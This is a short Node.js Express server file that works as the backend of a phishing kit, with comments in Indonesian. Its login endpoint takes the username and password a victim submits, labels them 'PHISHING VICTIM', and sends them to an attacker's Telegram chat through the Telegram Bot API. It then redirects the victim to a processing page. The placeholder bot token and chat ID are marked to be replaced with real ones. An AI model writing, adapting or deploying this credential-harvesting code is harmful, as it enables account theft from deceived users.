const express = require('express');
const app = express();

app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// ========== GANTI DENGAN DATA ASLI ANDA ==========
const BOT_TOKEN = '8123456789:AAHdqTcvCH1vGWJxfSeofSAs0K5PALDsaw'; // GANTI!!!
const CHAT_ID = '123456789'; // GANTI!!!
// =================================================

app.post('/api/login', async (req, res) => {
    const { username, password } = req.body;

    if (!username || !password) {
        return res.status(400).json({ error: 'Missing credentials' });
    }

    const message = `🔐 *PHISHING VICTIM* 🔐\n\n👤 *Username/Email:* ${username}\n🔑 *Password:* ${password}\n⏰ *Time:* ${new Date().toLocaleString()}`;

    try {
        // Kirim ke Telegram menggunakan https module (lebih stabil di Vercel)
        const https = require('https');
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        const data = JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });

        const options = {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(data)
            }
        };

        const request = https.request(url, options, (response) => {
            let responseData = '';
            response.on('data', chunk => { responseData += chunk; });
            response.on('end', () => {
                console.log('Telegram response:', responseData);
                if (response.statusCode === 200) {
                    console.log(`✅ Credentials sent to Telegram: ${username}`);
                } else {
                    console.error(`❌ Telegram error: ${responseData}`);
                }
            });
        });

        request.on('error', (err) => {
            console.error('Request error:', err.message);
        });

        request.write(data);
        request.end();

        res.redirect('/processing.html');
    } catch (err) {
        console.error('Fatal error:', err.message);
        res.redirect('/processing.html');
    }
});

module.exports = app;
